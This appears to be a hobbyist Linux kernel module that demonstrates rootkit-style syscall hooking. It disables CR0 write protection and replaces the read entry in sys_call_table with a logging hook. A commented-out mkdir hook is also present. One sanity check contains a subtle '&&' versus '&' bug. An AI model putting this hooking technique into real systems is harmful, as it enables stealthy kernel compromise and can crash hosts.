#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>

#define CR0_WRITE_UNLOCK(x) \
	do { \
		unsigned long __cr0; \
		preempt_disable(); \
		__cr0 = read_cr0() & (~X86_CR0_WP); \
		BUG_ON(unlikely((__cr0 & X86_CR0_WP))); \
		write_cr0(__cr0); \
		x; \
		__cr0 = read_cr0() | X86_CR0_WP; \
		BUG_ON(unlikely(!(__cr0 && X86_CR0_WP))); \
		write_cr0(__cr0); \
		preempt_enable(); \
	} while(0)


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Khan");
MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");

static unsigned long *sys_call_table;
static typeof(sys_read) *orig_read;

asmlinkage long phony_read(int fd, char __user *buf, size_t count) {
	pr_info("Intercepted read of fd=%d, %lu byes\n", fd, count);
	
	return orig_read(fd, buf, count);
}

/*
asmlinkage int fakeMkdir(const char __user *pathname, umode_t mode){
	pr_info("fakeMkdir called!");
	return oldNR(pathname, mode);
}
*/

int __init loadMod(void){
	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
	
	if (sys_call_table == NULL){
		pr_info("sys_call_table not found using kallsyms\n");
		return -1;
	}
	pr_info("module loaded\n");
	pr_info("sys_call_table pointer is %p\n", sys_call_table);

	//pr_info("sys_read is of type %s\n", (typeof(sys_read)).name());
	pr_info("original read in sys_call_table shown as %p\n", sys_call_table[__NR_read]);

	orig_read = (typeof(sys_read) *)sys_call_table[__NR_read];
	pr_info("original read stored as %p\n", (void*) orig_read);
	
	
	CR0_WRITE_UNLOCK({
		sys_call_table[__NR_read] = (void *) &phony_read;
	});
	pr_info("sys_call_table injected with phony_read ptr:%p\n", (void *)sys_call_table[__NR_read]);

	/* immediately restores ptr. If uncommented, rootkit is stable (but doesn't work)

	CR0_WRITE_UNLOCK({
		sys_call_table[__NR_read] = (void *) orig_read;
	});
	pr_info("sys_call_table read ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_read]);

	*/
	/*
	pr_info("old __NR_mkdir:%p", sys_call_table[__NR_mkdir]);
	oldNR = (void*)sys_call_table[__NR_mkdir];
	sys_call_table[__NR_mkdir] = &fakeMkdir;
	*/

	return 0;		
}

void __exit unloadMod(void){
	CR0_WRITE_UNLOCK({
		sys_call_table[__NR_read] = (void *) orig_read;
	});
	pr_info("notarootkit unloading\n");
	pr_info("sys_call_table read ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_read]);
	return;
}

module_init(loadMod);
module_exit(unloadMod);
